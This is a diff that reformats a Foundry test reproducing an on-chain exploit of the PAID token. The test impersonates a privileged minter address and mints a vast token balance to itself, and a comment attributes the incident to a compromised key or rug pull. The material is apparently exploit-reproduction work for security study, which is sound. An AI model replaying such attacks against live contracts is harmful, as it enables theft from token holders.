@@ -11,11 +11,14 @@ import "forge-std/Test.sol";
 // https://etherscan.io/tx/0x4bb10927ea7afc2336033574b74ebd6f73ef35ac0db1bb96229627c9d77555a0
 
 interface IPaid {
+
     function mint(address _owner, uint256 _amount) external;
     function balanceOf(address account) external view returns (uint256);
+
 }
 
 contract ContractTest is Test {
+
     // FakeToken FakeTokenContract;
     IPaid PAID = IPaid(0x8c8687fC965593DFb2F0b4EAeFD55E9D8df348df);
 
@@ -26,12 +29,9 @@ contract ContractTest is Test {
     function testExploit() public {
         vm.prank(0x18738290AF1Aaf96f0AcfA945C9C31aB21cd65bE);
         PAID.mint(address(this), 59_471_745_571_000_000_000_000_000); //key compromised or rugged
-        emit log_named_decimal_uint(
-            "[End] PAID balance after exploitation:",
-            PAID.balanceOf(address(this)),
-            18
-        );
+        emit log_named_decimal_uint("[End] PAID balance after exploitation:", PAID.balanceOf(address(this)), 18);
     }
 
     receive() external payable {}
+
 }
